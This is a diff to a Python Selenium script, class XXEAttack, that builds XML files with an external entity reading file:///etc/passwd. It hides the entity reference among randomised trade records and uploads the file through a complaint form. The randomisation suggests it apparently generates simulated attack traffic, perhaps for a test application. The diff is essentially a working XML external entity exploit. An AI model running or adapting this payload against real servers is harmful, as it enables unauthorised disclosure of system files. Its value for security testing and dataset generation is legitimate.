@@ -133,9 +133,68 @@ class XXEAttack(Attack):
         self.driver.find_element_by_xpath('/html/body/nav/div/ul/li[10]').click()
         random_sleep()
 
+        # 3. generate xxe file
+        file = open("Scenarios/xxe_gen_file.xml", "w")
+
+        file.write("<?xml version=\"1.0\" encoding=\"UTF-8\"?>\n")
+        file.write("\n")
+        file.write("<!DOCTYPE foo [<!ELEMENT foo ANY >\n")
+        file.write("        <!ENTITY xxe SYSTEM \"file:///etc/passwd\" >]>\n")
+        file.write("\n")
+        
+        # random trades block for each file
+        numOfTradesBlock = random.randint(1,10)
+        nameBuffer = []
+        name = person_name[random.randint(0,len(person_name)-1)]
+        
+        for j in range(numOfTradesBlock):
+            while name in nameBuffer:
+                name = person_name[random.randint(0,len(person_name)-1)]
+            nameBuffer.append(name)    
+
+            itemBuffer = []
+            item = item_name[random.randint(0,len(item_name)-1)]
+            itemBuffer.append(item)
+            units = random.randint(1,500)
+
+            file.write("<trades>\n")
+            file.write("    <metadata>\n")
+            file.write("        <name>" + item + "</name>\n")
+            file.write("        <trader>\n")
+            file.write("            <foo>&xxe;</foo>\n")
+            file.write("            <name>" + name + "</name>\n")
+            file.write("        </trader>\n")
+            file.write("        <units>" + str(units) + "</units>\n")
+            file.write("        <price>" + str(units * random.randint(1, 15)) + "</price>\n")
+
+            # random item for each consumer
+            for k in range(random.randint(0,27)): # 27 is the maximum of the items
+                while item in itemBuffer:
+                    item = item_name[random.randint(0,len(item_name)-1)]      
+
+                itemBuffer.append(item)
+                units = random.randint(1,500)
+
+                file.write("        <name>" + item + "</name>\n")
+                file.write("        <trader>\n")
+                file.write("            <name>" + name + "</name>\n")
+                file.write("        </trader>\n")
+                file.write("        <units>" + str(units) + "</units>\n")
+                file.write("        <price>" + str(units * random.randint(1, 15)) + "</price>\n")
+    
+            file.write("    </metadata>\n")
+
+            # Check if is the last block
+            if j == numOfTradesBlock - 1:
+                file.write("</trades>")
+            else:
+                file.write("</trades>\n")
+
+        file.close()
+
         # 3. type command and upload file
         self.driver.find_element_by_xpath('//*[@id="complaintMessage"]').send_keys(random_comment(2))
-        self.driver.find_element_by_xpath('//*[@id="file"]').send_keys(os.getcwd()+"/Scenarios/xxe_file/xxe_" + str(random.randint(1, 50)) + ".xml")
+        self.driver.find_element_by_xpath('//*[@id="file"]').send_keys(os.getcwd()+"/Scenarios/xxe_gen_file.xml")
         random_sleep()
         self.driver.find_element_by_xpath('//*[@id="submitButton"]').click()
 
